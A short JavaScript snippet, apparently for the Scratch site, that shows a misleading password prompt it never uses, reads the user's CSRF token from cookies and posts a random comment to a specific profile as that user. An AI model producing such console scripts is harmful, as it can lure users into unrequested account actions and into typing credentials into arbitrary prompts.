async function a(){
    let password=prompt("ログインのためのパスワードを入力");
    let token="";
        {
            let cookie=document.cookie;
            cookie=cookie.split(';');
            let cok=[[],[]];
            cookie.forEach(function(element){
                const elements=element.split("=");
                cok[0].push(elements[0]);
                cok[1].push(elements[1]);
            });
            token=cok[1][cok[0].indexOf(' scratchcsrftoken')];
        }
    let content=Math.random().toString()+" used."
    fetch(`/site-api/comments/user/yamaguchi03/add/`,{
      method: "POST",
      body: JSON.stringify({
        content: content,
        parent_id: "218400750",
        commentee_id: "62203658"
      }),
      headers: {
        'X-CSRFToken': token
      }
    });
}
a();

